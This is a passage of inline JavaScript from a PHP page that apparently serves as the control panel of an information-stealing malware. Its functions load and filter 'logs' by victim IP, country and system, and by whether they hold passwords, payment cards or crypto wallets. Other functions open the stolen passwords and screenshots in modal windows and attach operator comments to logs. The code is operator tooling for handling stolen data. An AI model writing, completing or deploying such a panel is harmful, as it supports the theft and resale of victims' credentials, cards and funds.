		$('.viewLogs').load(`browse.php?action=modal&page=${page}&settings_id=${settings_id}&settings_ip=${settings_ip}&settings_country=${settings_country}&settings_note=${settings_note}&settings_system=${settings_system}&settings_passwords=${settings_passwords}&settings_from=${settings_from}&settings_to=${settings_to}&settings_hide_empty=${settings_hide_empty}&settings_only_qnique=${settings_only_qnique}&settings_cards=${settings_cards}&settings_crypto=${settings_crypto}`);
	else{
		var request = `browse.php?action=modal&settings_id=${settings_id}&settings_ip=${settings_ip}&settings_country=${settings_country}&settings_note=${settings_note}&settings_system=`+ settings_system +`&settings_passwords=${settings_passwords}&settings_from=${settings_from}&settings_to=${settings_to}&settings_hide_empty=${settings_hide_empty}&settings_only_qnique=${settings_only_qnique}&settings_cards=${settings_cards}&settings_crypto=${settings_crypto}`;
		
		$('.viewLogs').load(request);
	}
	
	new Noty({
				timeout: 3500,
				text: 'Successful update logs list',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
};

// ---------------------------------------------------------------------------------------
// viewInfo
//
// View information about log in modal window
// ---------------------------------------------------------------------------------------
function viewInfo(url){
    $('.modal-body1').load(url,function(){
        $('#modalInfo').modal({show:true});
    });
};

// ---------------------------------------------------------------------------------------
// viewPasswords
//
// View log passwords in modal window
// ---------------------------------------------------------------------------------------
function viewPasswords(url){
    $('.modal-body2').load(url,function(){
        $('#modalPasswords').modal({show:true});
    });
};

// ---------------------------------------------------------------------------------------
// viewScreenshot
//
// View screnshoot from log in modal window
// ---------------------------------------------------------------------------------------
function viewScreenshot(url){
    $('.modal-body3').load(url,function(){
        $('#modalScreenshot').modal({show:true});
    });
};

// ---------------------------------------------------------------------------------------
// formatCountry
//
// View country flag in select2
// ---------------------------------------------------------------------------------------
function formatCountry(state){
	if (!state.id) return state.text;
	
	var baseUrl = "/Template/img/flags";
	var $state = $(
		'<span><img src="' + baseUrl + '/' + state.element.value.toLowerCase() + '.png" class="img-flag" style="width: 16px;" /> ' + state.text + '</span>'
	);
	
	return $state;
};

// ---------------------------------------------------------------------------------------
// UpdateComment
//
// Update comment on log
// ---------------------------------------------------------------------------------------
function UpdateComment(log_id){
	var newComment = document.getElementById("new_comment_" + log_id).value;
		
	var xhr = new XMLHttpRequest();

	xhr.open('GET', 'browse.php?action=update_comment&UID='+ log_id +'&comment=' + newComment);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.onload = function() {
		if (xhr.status === 200 && xhr.responseText == "success") {
			new Noty({
				timeout: 3500,
				text: 'Successful update comment',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		else {
			new Noty({
				timeout: 3500,
				text: 'Error: invalid response',
				type: 'error',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
	};
	xhr.send(encodeURI('name'));
}

// ---------------------------------------------------------------------------------------
// 
//
// Generate select2 objects
// ---------------------------------------------------------------------------------------
(function($){
	'use strict'
	
	var Defaults = $.fn.select2.amd.require('select2/defaults');
	
	$.extend(Defaults.defaults,
		{searchInputPlaceholder: ''
	});
	
	var SearchDropdown = $.fn.select2.amd.require('select2/dropdown/search');
	var _renderSearchDropdown = SearchDropdown.prototype.render;
	
	SearchDropdown.prototype.render = function(decorated) {
		var $rendered = _renderSearchDropdown.apply(this, Array.prototype.slice.apply(arguments));
		this.$search.attr('placeholder', this.options.get('searchInputPlaceholder'));
		
		return $rendered;
	};
})(window.jQuery);

// ---------------------------------------------------------------------------------------
// 
//
// Create select2 dropdown
// ---------------------------------------------------------------------------------------
$(function()
{
	'use strict'
	
	$('.select2').select2(
		{
			placeholder: 'All countries',
			searchInputPlaceholder: 'Search options',
			templateResult: formatCountry
	});
});

</script>

<? include_once 'Models/Footer.php'; ?>
</body>
</html>